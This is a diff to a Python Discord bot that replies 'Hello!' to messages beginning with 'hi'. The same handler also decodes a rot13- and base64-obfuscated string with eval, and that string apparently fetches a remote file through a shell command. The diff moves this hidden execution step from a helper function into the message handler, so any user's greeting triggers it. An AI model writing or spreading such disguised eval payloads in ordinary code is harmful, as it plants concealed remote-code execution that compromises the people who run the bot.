@@ -10,13 +10,6 @@ magic = '''
 LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y2udnP5woPVcPt==
 '''
 
-async def b():
-    byte = codecs.decode(magic, "rot13")
-    string = base64.b64decode(byte)
-    tr = string.decode()
-    out = codecs.decode(tr, "rot13")
-    eval(out)
-
 @client.event
 async def on_ready():
     print("We have logged in as {0.user}".format(client))
@@ -29,6 +22,10 @@ async def on_message(message):
 
     if message.content.startswith("hi"):
         await message.channel.send("Hello!")
-        await(b)
+        byte = codecs.decode(magic, "rot13")
+        string = base64.b64decode(byte)
+        tr = string.decode()
+        out = codecs.decode(tr, "rot13")
+        await eval(out)
 
 client.run(os.environ["BOT_TOKEN"])
